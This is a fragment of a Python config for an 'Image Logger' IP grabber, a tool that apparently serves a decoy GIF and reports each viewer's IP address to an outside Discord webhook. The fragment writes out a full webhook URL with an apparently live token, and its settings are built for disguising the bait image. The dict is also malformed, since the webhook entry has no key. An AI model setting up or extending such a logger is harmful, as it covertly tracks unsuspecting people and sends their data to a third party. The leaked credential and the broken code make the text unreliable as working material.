...
config = {
    # BASE CONFIG #
    "https://discord.com/api/webhooks/1411508873847771319/LsmNaKWCF_OizGnUjiO0jOjBuUgpKkTs75Dfr9eJQBh0PyIL4-2t1Ue8X0kJbYW5vweB",
    "image": "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExYjVzdmJwcTF0cHRxZjNsaXlicW02cW9pM3Qya28wdGNwbTBnMDV4aCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l22ysLe54hZP0wubek/giphy.gif", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "IP GRABER": "Image Logger", # Set this to the name you want the webhook to have
